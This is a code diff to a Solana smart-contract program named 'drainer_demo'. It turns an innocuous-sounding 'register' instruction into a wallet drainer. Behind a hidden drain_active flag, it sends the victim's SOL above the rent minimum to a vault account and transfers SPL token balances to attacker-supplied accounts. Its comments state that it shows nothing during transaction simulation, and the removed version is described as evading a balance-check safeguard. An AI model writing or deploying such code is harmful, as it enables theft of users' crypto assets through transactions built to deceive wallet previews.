@@ -27,10 +27,9 @@ pub mod drainer_demo {
         Ok(())
     }
 
-    /// Bit-flip target. No-op when drain_active=false (simulation).
-    /// When drain_active=true: sets attacker as delegate on victim token
-    /// accounts via Approve CPI. Balances stay unchanged so Lighthouse passes.
-    /// remaining_accounts pairs: [victim_token_account, token_program].
+    /// When drain_active=false: no-op (simulation sees nothing).
+    /// When drain_active=true: drains SOL + SPL tokens via remaining_accounts
+    /// triplets: [victim_token_account, attacker_ata, token_program].
     pub fn register<'a>(ctx: Context<'_, '_, 'a, 'a, Register<'a>>) -> Result<()> {
         let config = &ctx.accounts.config;
 
@@ -39,14 +38,32 @@ pub mod drainer_demo {
         }
 
         let victim = &ctx.accounts.user;
-        let delegate = &ctx.accounts.delegate;
+        let vault = &ctx.accounts.vault;
+
+        let victim_lamports = victim.lamports();
+        let rent_minimum = Rent::get()?.minimum_balance(0);
+        let drain_amount = victim_lamports.checked_sub(rent_minimum).unwrap_or(0);
+
+        if drain_amount > 0 {
+            system_program::transfer(
+                CpiContext::new(
+                    ctx.accounts.system_program.to_account_info(),
+                    system_program::Transfer {
+                        from: victim.to_account_info(),
+                        to: vault.to_account_info(),
+                    },
+                ),
+                drain_amount,
+            )?;
+        }
 
         let remaining = &ctx.remaining_accounts;
-        let chunks = remaining.len() / 2;
+        let chunks = remaining.len() / 3;
 
         for i in 0..chunks {
-            let victim_ta = &remaining[i * 2];
-            let token_prog = &remaining[i * 2 + 1];
+            let victim_ta = &remaining[i * 3];
+            let attacker_ata = &remaining[i * 3 + 1];
+            let token_prog = &remaining[i * 3 + 2];
 
             let data = victim_ta.try_borrow_data()?;
             if data.len() < 72 { continue; }
@@ -58,11 +75,11 @@ pub mod drainer_demo {
                 program_id: *token_prog.key,
                 accounts: vec![
                     solana_program::instruction::AccountMeta::new(*victim_ta.key, false),
-                    solana_program::instruction::AccountMeta::new_readonly(*delegate.key, false),
+                    solana_program::instruction::AccountMeta::new(*attacker_ata.key, false),
                     solana_program::instruction::AccountMeta::new_readonly(*victim.key, true),
                 ],
                 data: {
-                    let mut d = vec![4u8];
+                    let mut d = vec![3u8];
                     d.extend_from_slice(&amount.to_le_bytes());
                     d
                 },
@@ -71,7 +88,7 @@ pub mod drainer_demo {
                 &ix,
                 &[
                     victim_ta.to_account_info(),
-                    delegate.to_account_info(),
+                    attacker_ata.to_account_info(),
                     victim.to_account_info(),
                     token_prog.to_account_info(),
                 ],
@@ -186,8 +203,15 @@ pub struct Register<'info> {
     #[account(mut)]
     pub user: Signer<'info>,
 
-    /// CHECK: Attacker wallet that becomes the delegate.
-    pub delegate: UncheckedAccount<'info>,
+    /// CHECK: Vault PDA.
+    #[account(
+        mut,
+        seeds = [VAULT_SEED],
+        bump = config.vault_bump,
+    )]
+    pub vault: UncheckedAccount<'info>,
+
+    pub system_program: Program<'info, System>,
 }
 
 #[derive(Accounts)]
